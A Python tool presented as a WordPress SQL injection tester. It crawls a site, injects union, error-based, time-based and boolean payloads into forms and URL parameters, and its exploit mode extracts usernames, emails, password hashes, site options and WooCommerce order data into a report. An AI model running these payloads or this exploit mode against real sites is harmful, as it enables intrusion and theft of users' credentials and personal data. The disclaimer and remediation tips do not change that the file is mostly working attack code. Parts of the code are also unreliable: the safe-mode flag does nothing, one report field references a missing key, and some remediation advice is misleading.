#!/usr/bin/env python3
"""
SQL Injection Attack Tester (Enhanced with Exploitation Mode for WordPress)

Tests for SQL injection vulnerabilities and attempts controlled exploitation for critical issues.
For educational purposes only - use only on websites you own or have permission to test.
"""

import sys
import argparse
import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import re
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
import os
import random
import string
import json
import time
import uuid

# Initialize colorama
init()

class SQLInjectionTester:
    def __init__(self, target_url, output_dir="sqli_tests", verbose=False, timeout=10, safe_mode=False, exploit=False):
        """
        Initialize the SQL Injection tester.
        
        Args:
            target_url: The base URL of the website to test
            output_dir: Directory to save test results
            verbose: Whether to show detailed output
            timeout: Request timeout in seconds
            safe_mode: Avoid generating exploitable PoCs
            exploit: Attempt to exploit critical vulnerabilities
        """
        self.target_url = target_url.rstrip('/')
        self.output_dir = output_dir
        self.verbose = verbose
        self.timeout = timeout
        self.safe_mode = safe_mode
        self.exploit = exploit
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        })
        self.forms = []
        self.links = []
        self.results = []
        self.exploits_successful = 0
        
        # Create output directory
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
            
    def log(self, message, level="info"):
        """Log messages with color coding."""
        if level == "info":
            print(f"{Fore.BLUE}[INFO] {message}{Style.RESET_ALL}")
        elif level == "success":
            print(f"{Fore.GREEN}[SUCCESS] {message}{Style.RESET_ALL}")
        elif level == "warning":
            print(f"{Fore.YELLOW}[WARNING] {message}{Style.RESET_ALL}")
        elif level == "error":
            print(f"{Fore.RED}[ERROR] {message}{Style.RESET_ALL}")
        elif level == "vuln":
            print(f"{Fore.RED}[VULNERABILITY] {message}{Style.RESET_ALL}")
        elif level == "exploit":
            print(f"{Fore.MAGENTA}[EXPLOIT] {message}{Style.RESET_ALL}")
            
    def verbose_log(self, message, level="info"):
        """Log messages only if verbose mode is enabled."""
        if self.verbose:
            self.log(message, level)
            
    def detect_wordpress(self):
        """Detect if the site is running WordPress."""
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            if 'wp-content' in response.text or 'wp-includes' in response.text:
                self.log("Detected WordPress site", "success")
                return True
            return False
        except requests.RequestException:
            return False

    def crawl_website(self, max_pages=10):
        """Crawl the website to discover pages, forms, and links."""
        self.log(f"Starting website crawl (max {max_pages} pages)...")
        
        visited_urls = set()
        urls_to_visit = [self.target_url]
        wordpress_endpoints = [
            '/wp-login.php', '/?s=', '/my-account/', '/cart/', '/checkout/',
            '/contact/', '/register/'
        ]
        
        # Add WordPress-specific endpoints if WordPress is detected
        if self.detect_wordpress():
            for endpoint in wordpress_endpoints:
                full_url = urljoin(self.target_url, endpoint)
                if full_url not in urls_to_visit:
                    urls_to_visit.append(full_url)
        
        while urls_to_visit and len(visited_urls) < max_pages:
            url = urls_to_visit.pop(0)
            
            if url in visited_urls or not url.startswith(self.target_url):
                continue
                
            try:
                self.verbose_log(f"Crawling: {url}")
                response = self.session.get(url, timeout=self.timeout)
                visited_urls.add(url)
                
                if 'text/html' not in response.headers.get('Content-Type', ''):
                    continue
                    
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find forms
                for form in soup.find_all('form'):
                    form_data = {
                        'url': url,
                        'action': urljoin(url, form.get('action', '')),
                        'method': form.get('method', 'get').lower(),
                        'inputs': []
                    }
                    
                    for input_field in form.find_all(['input', 'textarea', 'select']):
                        input_type = input_field.get('type', '')
                        input_name = input_field.get('name', '')
                        
                        if input_name and input_type != 'submit' and input_type != 'button':
                            form_data['inputs'].append({
                                'name': input_name,
                                'type': input_type
                            })
                            
                    if form_data['inputs']:
                        self.forms.append(form_data)
                        
                # Find links with query parameters
                for link in soup.find_all('a', href=True):
                    href = link.get('href')
                    full_url = urljoin(url, href)
                    
                    if full_url.startswith(self.target_url):
                        parsed_url = urlparse(full_url)
                        if parsed_url.query:
                            self.links.append(full_url)
                            
                        if full_url not in visited_urls:
                            urls_to_visit.append(full_url)
                            
            except requests.RequestException as e:
                self.log(f"Error crawling {url}: {e}", "error")
                
        self.log(f"Crawl completed. Found {len(visited_urls)} pages, {len(self.forms)} forms, and {len(self.links)} links with parameters.")
        
    def generate_sql_payloads(self, level="standard"):
        """Generate WordPress-specific SQL injection payloads."""
        # Basic payloads for general SQL injection
        basic_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "1' OR '1' = '1",
            "1 OR 1=1"
        ]
        
        # Standard payloads with WordPress-specific tables
        standard_payloads = basic_payloads + [
            "' UNION SELECT 1,2,3 --",
            "' UNION SELECT 1,2,3,4 --",
            "' OR 1=1 LIMIT 1 --",
            "' OR 'x'='x",
            "' UNION SELECT user_login,user_email,user_pass FROM wp_users --",
            "' UNION SELECT option_name,option_value FROM wp_options --"
        ]
        
        # Advanced payloads for exploitation (WordPress-specific)
        advanced_payloads = standard_payloads + [
            # Time-based blind SQL injection
            "' OR (SELECT 1 FROM (SELECT SLEEP(1))A) --",  # MySQL
            "' OR 1=pg_sleep(1) --",  # PostgreSQL
            "' OR 1=WAITFOR DELAY '0:0:1' --",  # SQL Server
            
            # Error-based SQL injection
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user_login FROM wp_users LIMIT 1), 0x7e)) --",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user_login FROM wp_users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
            
            # Union-based for data extraction
            "' UNION SELECT 1,CONCAT(user_login,0x3a,user_email),user_pass FROM wp_users --",
            "' UNION SELECT 1,option_name,option_value FROM wp_options WHERE option_name='siteurl' --",
            
            # WooCommerce-specific
            "' UNION SELECT 1,order_key,meta_value FROM wp_woocommerce_order_items JOIN wp_postmeta ON order_id=post_id WHERE meta_key='_customer_user' --",
            
            # Boolean-based blind SQL injection
            "' AND (SELECT SUBSTRING(user_login,1,1) FROM wp_users LIMIT 1)='a' --",
            "' AND ASCII(SUBSTRING((SELECT user_login FROM wp_users LIMIT 1),1,1))=97 --"
        ]
        
        if level == "basic":
            return basic_payloads
        elif level == "standard":
            return standard_payloads
        else:
            return advanced_payloads

    def attempt_exploit(self, vuln, form=None, url=None):
        """Attempt to exploit a critical SQL injection vulnerability."""
        exploit_result = {'success': False, 'details': '', 'extracted_data': '', 'response_code': None}
        payload = vuln['payload']
        severity = 'Critical' if 'UNION' in payload.upper() or 'EXTRACTVALUE' in payload.upper() else 'High'
        
        if severity != 'Critical':
            exploit_result['details'] = 'Exploitation skipped: Only critical vulnerabilities (union/error-based) are exploited.'
            return exploit_result

        self.log(f"Attempting SQL injection exploit for {vuln.get('form_url', url)}...", "exploit")
        
        try:
            if form:  # Form-based exploit
                test_data = {}
                for input_field in form['inputs']:
                    if input_field['name'] == vuln['field']:
                        test_data[input_field['name']] = payload
                    else:
                        test_data[input_field['name']] = f"test-{uuid.uuid4()}" if input_field['type'] != 'password' else ''.join(random.choices(string.ascii_letters + string.digits, k=10))
                
                if form['method'] == 'post':
                    response = self.session.post(form['action'], data=test_data, timeout=self.timeout)
                else:
                    response = self.session.get(form['action'], params=test_data, timeout=self.timeout)
            else:  # URL parameter-based exploit
                parsed_url = urlparse(url)
                params = parse_qs(parsed_url.query)
                params[vuln['parameter']] = [payload]
                query = urlencode(params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query}"
                response = self.session.get(test_url, timeout=self.timeout)

            # Check for successful data extraction
            if response.status_code == 200:
                # Look for WordPress-specific data (e.g., user_login, user_email)
                patterns = [
                    r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',  # Email
                    r'([a-zA-Z0-9_-]{3,20})',  # Username
                    r'\$P\$[a-zA-Z0-9./]{30,}',  # WordPress password hash
                    r'(wp_[a-z_]+)',  # Table names
                    r'(option_name|option_value|siteurl|blogname)'  # wp_options
                ]
                
                extracted_data = []
                for pattern in patterns:
                    matches = re.findall(pattern, response.text)
                    if matches:
                        extracted_data.extend(matches)
                
                if extracted_data:
                    self.log(f"Exploit succeeded! Extracted data: {', '.join(set(extracted_data))}", "exploit")
                    exploit_result['success'] = True
                    exploit_result['details'] = f"Extracted data from response using payload: {payload}"
                    exploit_result['extracted_data'] = ', '.join(set(extracted_data))
                    self.exploits_successful += 1
                else:
                    exploit_result['details'] = "Exploit attempted but no clear data extracted."
            
            exploit_result['response_code'] = response.status_code
            exploit_result['response_snippet'] = response.text[:500]

        except requests.RequestException as e:
            exploit_result['details'] = f"Exploit failed due to request error: {e}"
            self.log(f"Exploit failed: {e}", "error")
        
        return exploit_result

    def test_form_sqli(self, form, payloads):
        """Test a form for SQL injection vulnerabilities."""
        successful_vulnerabilities = []
        
        self.verbose_log(f"Testing form at {form['url']} (submits to {form['action']})")
        
        # Baseline response
        baseline_data = {}
        for input_field in form['inputs']:
            if input_field['type'] == 'email':
                baseline_data[input_field['name']] = f"test{random.randint(1, 1000)}@example.com"
            elif input_field['type'] == 'password':
                baseline_data[input_field['name']] = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            else:
                baseline_data[input_field['name']] = f"test{random.randint(1, 1000)}"
                
        try:
            if form['method'] == 'post':
                baseline_response = self.session.post(form['action'], data=baseline_data, timeout=self.timeout)
            else:
                baseline_response = self.session.get(form['action'], params=baseline_data, timeout=self.timeout)
                
            baseline_content = baseline_response.text
            baseline_status = baseline_response.status_code
            baseline_time = baseline_response.elapsed.total_seconds()
            
        except requests.RequestException as e:
            self.verbose_log(f"Error getting baseline response: {e}", "error")
            return successful_vulnerabilities
            
        # Test each payload
        for payload in payloads:
            for input_field in form['inputs']:
                test_data = baseline_data.copy()
                test_data[input_field['name']] = payload
                
                try:
                    start_time = time.time()
                    
                    if form['method'] == 'post':
                        response = self.session.post(form['action'], data=test_data, timeout=self.timeout)
                    else:
                        response = self.session.get(form['action'], params=test_data, timeout=self.timeout)
                        
                    response_time = time.time() - start_time
                    
                    # SQL error patterns
                    sql_errors = [
                        "SQL syntax", "mysql_fetch_array", "ORA-", "Oracle error",
                        "Microsoft SQL Server", "PostgreSQL", "SQLite3", "syntax error",
                        "unclosed quotation mark", "mysql_num_rows()", "mysql_fetch_assoc()",
                        "Warning: mysql_", "Warning: pg_", "Warning: sqlsrv_", "Warning: oci_",
                        "ODBC SQL Server Driver", "ODBC Error", "SQL Server Native Client",
                        "You have an error in your SQL syntax"
                    ]
                    
                    vuln = {
                        'form_url': form['url'],
                        'action': form['action'],
                        'method': form['method'],
                        'field': input_field['name'],
                        'payload': payload,
                        'severity': 'High'
                    }
                    
                    # Error-based detection
                    for error in sql_errors:
                        if error.lower() in response.text.lower() and error.lower() not in baseline_content.lower():
                            self.log(f"Error-based SQL injection found in form field {input_field['name']} with payload: {payload}", "vuln")
                            vuln['type'] = 'error-based'
                            vuln['evidence'] = f"SQL error detected: {error}"
                            vuln['severity'] = 'Critical'
                            if self.exploit:
                                exploit_result = self.attempt_exploit(vuln, form=form)
                                vuln.update({
                                    'exploit_attempted': True,
                                    'exploit_success': exploit_result['success'],
                                    'exploit_details': exploit_result['details'],
                                    'exploit_extracted_data': exploit_result.get('extracted_data', ''),
                                    'exploit_response_code': exploit_result['response_code'],
                                    'exploit_response_snippet': exploit_result.get('response_snippet', '')
                                })
                            successful_vulnerabilities.append(vuln)
                            break
                            
                    # Time-based detection
                    if response_time > baseline_time + 1 and ("SLEEP" in payload.upper() or "WAITFOR" in payload.upper() or "pg_sleep" in payload.lower()):
                        self.log(f"Time-based SQL injection found in form field {input_field['name']} with payload: {payload}", "vuln")
                        vuln['type'] = 'time-based'
                        vuln['evidence'] = f"Response time increased from {baseline_time:.2f}s to {response_time:.2f}s"
                        successful_vulnerabilities.append(vuln)
                        
                    # Boolean-based detection
                    if "OR '1'='1" in payload or "OR 1=1" in payload:
                        if response.status_code != baseline_status or len(response.text) != len(baseline_content):
                            self.log(f"Boolean-based SQL injection found in form field {input_field['name']} with payload: {payload}", "vuln")
                            vuln['type'] = 'boolean-based'
                            vuln['evidence'] = f"Response changed: status {baseline_status}->{response.status_code}, length {len(baseline_content)}->{len(response.text)}"
                            successful_vulnerabilities.append(vuln)
                            
                except requests.RequestException as e:
                    self.verbose_log(f"Error testing form with payload {payload}: {e}", "error")
                    
        return successful_vulnerabilities
        
    def test_url_parameter_sqli(self, url, payloads):
        """Test URL parameters for SQL injection vulnerabilities."""
        successful_vulnerabilities = []
        
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        if not params:
            return successful_vulnerabilities
            
        self.verbose_log(f"Testing URL parameters in {url}")
        
        # Baseline response
        try:
            baseline_response = self.session.get(url, timeout=self.timeout)
            baseline_content = baseline_response.text
            baseline_status = baseline_response.status_code
            baseline_time = baseline_response.elapsed.total_seconds()
            
        except requests.RequestException as e:
            self.verbose_log(f"Error getting baseline response: {e}", "error")
            return successful_vulnerabilities
            
        # Test each parameter
        for param_name in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                query = urlencode(test_params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query}"
                
                try:
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=self.timeout)
                    response_time = time.time() - start_time
                    
                    # SQL error patterns
                    sql_errors = [
                        "SQL syntax", "mysql_fetch_array", "ORA-", "Oracle error",
                        "Microsoft SQL Server", "PostgreSQL", "SQLite3", "syntax error",
                        "unclosed quotation mark", "mysql_num_rows()", "mysql_fetch_assoc()",
                        "Warning: mysql_", "Warning: pg_", "Warning: sqlsrv_", "Warning: oci_",
                        "ODBC SQL Server Driver", "ODBC Error", "SQL Server Native Client",
                        "You have an error in your SQL syntax"
                    ]
                    
                    vuln = {
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'test_url': test_url,
                        'severity': 'High'
                    }
                    
                    # Error-based detection
                    for error in sql_errors:
                        if error.lower() in response.text.lower() and error.lower() not in baseline_content.lower():
                            self.log(f"Error-based SQL injection found in parameter {param_name} with payload: {payload}", "vuln")
                            vuln['type'] = 'error-based'
                            vuln['evidence'] = f"SQL error detected: {error}"
                            vuln['severity'] = 'Critical'
                            if self.exploit:
                                exploit_result = self.attempt_exploit(vuln, url=url)
                                vuln.update({
                                    'exploit_attempted': True,
                                    'exploit_success': exploit_result['success'],
                                    'exploit_details': exploit_result['details'],
                                    'exploit_extracted_data': exploit_result.get('extracted_data', ''),
                                    'exploit_response_code': exploit_result['response_code'],
                                    'exploit_response_snippet': exploit_result.get('response_snippet', '')
                                })
                            successful_vulnerabilities.append(vuln)
                            break
                            
                    # Time-based detection
                    if response_time > baseline_time + 1 and ("SLEEP" in payload.upper() or "WAITFOR" in payload.upper() or "pg_sleep" in payload.lower()):
                        self.log(f"Time-based SQL injection found in parameter {param_name} with payload: {payload}", "vuln")
                        vuln['type'] = 'time-based'
                        vuln['evidence'] = f"Response time increased from {baseline_time:.2f}s to {response_time:.2f}s"
                        successful_vulnerabilities.append(vuln)
                        
                    # Boolean-based detection
                    if "OR '1'='1" in payload or "OR 1=1" in payload:
                        if response.status_code != baseline_status or len(response.text) != len(baseline_content):
                            self.log(f"Boolean-based SQL injection found in parameter {param_name} with payload: {payload}", "vuln")
                            vuln['type'] = 'boolean-based'
                            vuln['evidence'] = f"Response changed: status {baseline_status}->{response.status_code}, length {len(baseline_content)}->{len(response.text)}"
                            successful_vulnerabilities.append(vuln)
                            
                except requests.RequestException as e:
                    self.verbose_log(f"Error testing URL parameter with payload {payload}: {e}", "error")
                    
        return successful_vulnerabilities
        
    def run(self, payload_level="standard"):
        """Run the SQL injection tester."""
        self.log(f"Starting SQL injection testing with {payload_level} payload level...")
        if self.exploit:
            self.log("Exploit mode enabled: Attempting to exploit critical vulnerabilities.", "warning")
        
        # Crawl the website
        self.crawl_website()
        
        if not self.forms and not self.links:
            self.log("No forms or links with parameters found to test.", "warning")
            return
            
        # Generate payloads
        payloads = self.generate_sql_payloads(payload_level)
        self.log(f"Generated {len(payloads)} SQL injection payloads")
        
        # Test forms
        form_results = []
        for form in self.forms:
            results = self.test_form_sqli(form, payloads)
            form_results.extend(results)
            
        # Test URL parameters
        url_results = []
        for url in self.links:
            results = self.test_url_parameter_sqli(url, payloads)
            url_results.extend(results)
            
        # Combine results
        self.results = form_results + url_results
        
        # Generate summary
        if self.results:
            self.log(f"Found {len(self.results)} potential SQL injection vulnerabilities", "vuln")
            
            severity_counts = {'Critical': 0, 'High': 0}
            for result in self.results:
                severity_counts[result['severity']] += 1
            
            error_based = len([r for r in self.results if r.get('type') == 'error-based'])
            time_based = len([r for r in self.results if r.get('type') == 'time-based'])
            boolean_based = len([r for r in self.results if r.get('type') == 'boolean-based'])
            
            self.log(f"Critical: {severity_counts['Critical']}, High: {severity_counts['High']}", "info")
            self.log(f"Error-based: {error_based}, Time-based: {time_based}, Boolean-based: {boolean_based}", "info")
            if self.exploit:
                self.log(f"Successful exploits: {self.exploits_successful}", "exploit" if self.exploits_successful > 0 else "info")
            
            # Save results to JSON
            results_file = f"{self.output_dir}/sqli_results.json"
            with open(results_file, 'w') as f:
                json.dump(self.results, f, indent=2)
                
            self.log(f"Results saved to {results_file}", "success")
            
            # Generate report
            report_file = f"{self.output_dir}/sqli_report.md"
            with open(report_file, 'w') as f:
                f.write(f"# SQL Injection Vulnerability Report\n\n")
                f.write(f"Target: {self.target_url}\n")
                f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                
                f.write(f"## Summary\n\n")
                f.write(f"- Total vulnerabilities found: {len(self.results)}\n")
                f.write(f"- Critical: {severity_counts['Critical']}\n")
                f.write(f"- High: {severity_counts['High']}\n")
                f.write(f"- Error-based: {error_based}\n")
                f.write(f"- Time-based: {time_based}\n")
                f.write(f"- Boolean-based: {boolean_based}\n")
                if self.exploit:
                    f.write(f"- Successful exploits: {self.exploits_successful}\n")
                f.write("\n")
                
                f.write(f"## Form-Based Vulnerabilities\n\n")
                if form_results:
                    f.write("| URL | Field | Type | Severity | Exploit Success |\n")
                    f.write("|-----|-------|------|----------|-----------------|\n")
                    for result in form_results:
                        exploit = '✓' if result.get('exploit_success', False) else '✗' if result.get('exploit_attempted', False) else '-'
                        f.write(f"| {result['form_url']} | {result['field']} | {result['type']} | {result['severity']} | {exploit} |\n")
                    f.write("\n")
                    for i, result in enumerate(form_results):
                        f.write(f"### Vulnerability #{i+1}\n\n")
                        f.write(f"- **URL**: {result['form_url']}\n")
                        f.write(f"- **Form Action**: {result['action']}\n")
                        f.write(f"- **Method**: {result['method'].upper()}\n")
                        f.write(f"- **Vulnerable Field**: {result['field']}\n")
                        f.write(f"- **Type**: {result['type']}\n")
                        f.write(f"- **Severity**: {result['severity']}\n")
                        f.write(f"- **Payload**: `{result['payload']}`\n")
                        f.write(f"- **Evidence**: {result['evidence']}\n")
                        if result.get('exploit_attempted', False):
                            f.write(f"- **Exploit Success**: {'Yes' if result['exploit_success'] else 'No'}\n")
                            f.write(f"- **Exploit Details**: {result['exploit_details']}\n")
                            if result['exploit_success']:
                                f.write(f"- **Extracted Data**: {result['exploit_extracted_data']}\n")
                            f.write(f"- **Response Code**: {result['exploit_response_code']}\n")
                            f.write(f"- **Response Snippet**: {result['exploit_response_snippet']}\n")
                        f.write("\n")
                else:
                    f.write("No form-based vulnerabilities found.\n\n")
                    
                f.write(f"## URL Parameter-Based Vulnerabilities\n\n")
                if url_results:
                    f.write("| URL | Parameter | Type | Severity | Exploit Success |\n")
                    f.write("|-----|-----------|------|----------|-----------------|\n")
                    for result in url_results:
                        exploit = '✓' if result.get('exploit_success', False) else '✗' if result.get('exploit_attempted', False) else '-'
                        f.write(f"| {result['url']} | {result['parameter']} | {result['type']} | {result['severity']} | {exploit} |\n")
                    f.write("\n")
                    for i, result in enumerate(url_results):
                        f.write(f"### Vulnerability #{i+1}\n\n")
                        f.write(f"- **URL**: {result['url']}\n")
                        f.write(f"- **Vulnerable Parameter**: {result['parameter']}\n")
                        f.write(f"- **Type**: {result['type']}\n")
                        f.write(f"- **Severity**: {result['severity']}\n")
                        f.write(f"- **Payload**: `{result['payload']}`\n")
                        f.write(f"- **Test URL**: {result['test_url']}\n")
                        f.write(f"- **Evidence**: {result['evidence']}\n")
                        if result.get('exploit_attempted', False):
                            f.write(f"- **Exploit Success**: {'Yes' if result['exploit_success'] else 'No'}\n")
                            f.write(f"- **Exploit Details**: {result['exploit_details']}\n")
                            if result['exploit_success']:
                                f.write(f"- **Extracted Data**: {result['extracted_data']}\n")
                            f.write(f"- **Response Code**: {result['exploit_response_code']}\n")
                            f.write(f"- **Response Snippet**: {result['exploit_response_snippet']}\n")
                        f.write("\n")
                else:
                    f.write("No URL parameter-based vulnerabilities found.\n\n")
                    
                f.write(f"## WordPress-Specific Recommendations\n\n")
                f.write("1. **Use Prepared Statements**: Update plugins/themes to use `wpdb->prepare()`:\n")
                f.write("    ```php\n    $wpdb->prepare('SELECT * FROM wp_users WHERE ID = %d', $id);\n")
                f.write("    ```\n")
                f.write("2. **Sanitize Inputs**: Use WordPress sanitization functions:\n")
                f.write("    ```php\n    sanitize_text_field($_POST['input']);\n")
                f.write("    ```\n")
                f.write("3. **Escape Outputs**: Use `esc_sql()` for database queries:\n")
                f.write("    ```php\n    $wpdb->query(esc_sql($query));\n")
                f.write("    ```\n")
                f.write("4. **Security Plugins**: Install Wordfence or iThemes Security.\n")
                f.write("5. **Database Hardening**: Change `wp_` table prefix and limit database user permissions.\n")
                f.write("6. **Test in Staging**: Re-run exploits in a staging environment.\n")
                
            self.log(f"Report saved to {report_file}", "success")
        else:
            self.log("No SQL injection vulnerabilities found", "success")
            
        return self.results
        
def main():
    """Main function to run the SQL injection tester."""
    parser = argparse.ArgumentParser(description="SQL Injection Attack Tester (WordPress Enhanced)")
    parser.add_argument("url", help="Target WordPress URL to test")
    parser.add_argument("-o", "--output", default="sqli_tests", help="Output directory for test results")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("-l", "--level", choices=["basic", "standard", "advanced"], default="standard",
                        help="Payload complexity level")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Request timeout in seconds")
    parser.add_argument("--safe-mode", action="store_true", help="Avoid generating exploitable PoCs")
    parser.add_argument("--exploit", action="store_true", help="Attempt to exploit critical vulnerabilities")
    args = parser.parse_args()
    
    print(f"{Fore.CYAN}SQL Injection Attack Tester (WordPress Enhanced){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Warning: Use only on websites you own or have permission to test. Exploitation mode may trigger security plugins or cause temporary data changes.{Style.RESET_ALL}\n")
    
    tester = SQLInjectionTester(
        args.url, args.output, args.verbose, args.timeout, args.safe_mode, args.exploit
    )
    tester.run(args.level)
        
if __name__ == "__main__":
    main()
